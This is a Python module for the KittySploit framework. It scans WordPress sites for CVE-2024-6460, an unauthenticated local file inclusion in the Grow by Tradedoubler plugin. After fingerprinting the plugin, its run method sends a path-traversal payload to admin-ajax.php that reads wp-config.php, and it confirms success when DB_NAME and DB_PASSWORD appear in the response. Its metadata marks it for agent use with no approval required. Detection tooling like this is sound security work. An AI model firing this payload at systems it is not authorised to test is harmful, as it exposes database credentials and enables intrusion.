#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Grow by Tradedoubler WordPress plugin through version 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Grow by Tradedoubler Plugin < 2.0.22 - Unauthenticated Local File Inclusion Detection',
        'description': 'The Grow by Tradedoubler WordPress plugin through version 2.0.21 is vulnerable to Local File Inclusion via the component parameter. This makes it possible for attackers to include and execute PHP files on the server, allowing the execution of any PHP code in those files.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'wp', 'wordpress', 'wp-plugin', 'lfi', 'tradedoubler-affiliate-tracker', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/ba2f53e0-30be-4f37-91bc-5fa151f1eee7',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-6460',
        ],
        'cve': 'CVE-2024-6460',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('tradedoubler-affiliate-tracker',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data='action=tm_load_data&component=../../../../wp-config.php\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='WordPress Grow by Tradedoubler Plugin < 2.0.22 - Unauthenticated Local File Inclusion detected', path=path)
            return True
        return False

